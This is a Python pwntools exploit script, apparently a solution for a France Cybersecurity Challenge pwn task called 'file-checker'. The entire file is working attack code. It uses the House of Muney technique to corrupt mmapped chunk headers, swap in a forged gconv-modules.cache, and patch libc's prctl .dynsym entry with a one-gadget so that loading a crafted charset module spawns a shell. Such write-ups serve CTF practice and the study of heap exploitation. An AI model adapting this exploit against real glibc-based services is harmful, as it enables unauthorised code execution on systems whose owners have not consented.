#!/usr/bin/python3

from pwn import *

elf = ELF('./file-checker')
libc = ELF('./libc.so.6')

context.arch = 'amd64'

r = remote('challenges.france-cybersecurity-challenge.fr', 2101)

def prepare_file(idx, size, filename, newline=True):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(idx).encode())
    r.sendlineafter(b': ', str(size).encode())
    if newline:
        r.sendlineafter(b': ', filename)
    else:
        r.sendafter(b': ', filename)

def clean_file(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', str(idx).encode())

def handle_file(idx, mode):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b': ', str(idx).encode())
    r.sendlineafter(b'append\n', str(mode).encode())

def trigger_fopen(idx, mode_idx):
    handle_file(idx, (elf.sym['files'] - 0x3d10) // 8 + mode_idx + 1)

def fopen_mode(idx, mode):
    prepare_file(0, len(mode), mode)
    trigger_fopen(idx, 0)

def craft_gconv_module(paths, keepso=False):
    gconv_module = ""
    for k,p in paths.items():
        gconv_module += f"module  {k.upper()}//    INTERNAL      {p[1:]}    1\n"
        gconv_module += f"module  INTERNAL    {k.upper()}//      {p[1:]}    1\n"

    with open("gconv-modules/gconv-modules", "w") as f:
        f.write(gconv_module)

    os.system("iconvconfig --nostdlib --prefix='/' -o gconv-config-evil.cache ./gconv-modules/")

    with open("gconv-config-evil.cache", "rb") as f:
        content = f.read()

    content = content.replace(b"./gconv-modules", b"/".ljust(15, b'\x00'))
    if not keepso and any(path[-3:] != ".so" for path in paths):
        content = content.replace(b".so\x00", b"\x00"*4)

    return content

def exploit():

    # Step 1: Load our own gconv-modules.cache file

    # Create dummy file
    prepare_file(1, 0x20, b'/app/flag.txt')

    # Use an unknown ccs mode to mmap gconv-modules.cache file into process VAS
    fopen_mode(1, b"r,ccs=foobar")

    # Allocate the first mmaped chunk (size > mp_.mmap_threshold)
    # This will be the victim target using House of Muney technique
    prepare_file(2, 0x22000, b'Y'*8)

    # Free it to leave space for another mmaped chunk
    # Note that &files[2] will be a dangling pointer to unmapped memory
    clean_file(2) 

    # Allocate a bigger mmaped chunk so that files[3] = files[2] - 0x1000
    # Corrupt the files[2] previous chunk header and set a size of 0x24000 
    # to target first pages of gconv-modules.cache file which is next to it
    prepare_file(3, 0x23000, b'Y'*0xff0 + p64(0) + p64(0x24002))

    # free(files[2]) to munmap gconv-modules.cache first pages
    clean_file(2)

    # free files[3] to clean the memory layout
    # Be careful, since we freed files[2], mp_.mmap_threshold will be set to 0x24000
    clean_file(3)

    # Prepare the custom gconv-modules.cache file that will be replaced next
    # ccs=pwn will load libdrop_ambient.so.0.0.0 in the process VAS
    fake_gconv_modules = craft_gconv_module({
        "pwn": "/usr/lib/x86_64-linux-gnu/libdrop_ambient.so.0.0.0"
    }, keepso=False) 

    # Strip any newlines as the input is read using fgets
    fake_gconv_modules = fake_gconv_modules.replace(b"\n", b"\x00")

    # Allocate a new mmaped chunk that will be allocated in the middle
    # of the original gconv-modules.cache mmaped file 
    prepare_file(2, 0x24000 + 0xf00 + 0x1000, p8(0)*(0x24000 + 0x1000 - 0x10) + fake_gconv_modules)

    # Step 2: Patch libc's .dynsym section with our own content, using House of Muney

    # Prepare constants, we're going to patch `prctl` .dynsym entry with a one gadget
    prctl_dynsym_offset = 0x00a9a8
    dynsym = prctl_dynsym_offset

    # Huge chunk is required in order to allocate it just before the libc
    # else it would be allocated near our previous allocated chunk that corrupts gconv-modules.cache
    BASE_SIZE = 0x180000 
    LIBC_SIZE = 0x28000
    PATCH_SIZE = (dynsym + 0xfff) & ~0xfff # Align to page

    with open("libc.so.6", "rb") as f:
        libc_header = f.read(LIBC_SIZE)

    libc_patched = libc_header
    libc_patched = libc_header[:dynsym+0x8]
    libc_patched += p64(0x0ef52b) # magic one gadget
    libc_patched += libc_header[dynsym+0x10:]
    libc_patched = libc_patched.replace(b"\n", p8(0xb)) # strip newlines

    # Here perform the same technique as before, based on House of Muney
    # First allocate a chunk that will be placed just before libc
    # -0x20 is used so that the real chunk size will be BASE_SIZE
    prepare_file(2, BASE_SIZE - 0x20, b'A'*8)
    clean_file(2)

    # Allocate a second mmaped chunk such that files[3] - files[2] = 0x8000
    # Corrupt files[2] header with a size that corresponds to files[2] size
    # plus the amount of pages we need to patch within libc header
    prepare_file(3, BASE_SIZE + 0x8000 - 0x20, b'Y'*(0x8000 - 0x10) + p64(0) + p64(((BASE_SIZE + PATCH_SIZE) | 2)))

    # A part of the libc header is now munmaped
    clean_file(2)
    clean_file(3)

    alloc_size = BASE_SIZE + PATCH_SIZE - 0x20 + 0x1000
    send_content = p8(0)*(BASE_SIZE + 0x1000 - 0x10) + libc_patched[:PATCH_SIZE - 0x10]

    # Allocate another mmaped chunk whose size is > mp_.mmap_threshold (= BASE_SIZE + PATCH_SIZE)
    # Once filled with our content, libc .dynsym should be patched with our own data
    prepare_file(3, alloc_size, send_content, newline=False)

    # Trigger the load of libdrop_ambient.so.0.0.0
    # The loader will resolve the imported symbols from libc, the GOT of prctl will point to our one gadget
    # Its constructors will be called by the loader, including prctl. The one gadget gets called
    fopen_mode(1, b"r,ccs=pwn")

    # If everything went well, we should have a working shell

    r.interactive()

if __name__ == '__main__':
    exploit()
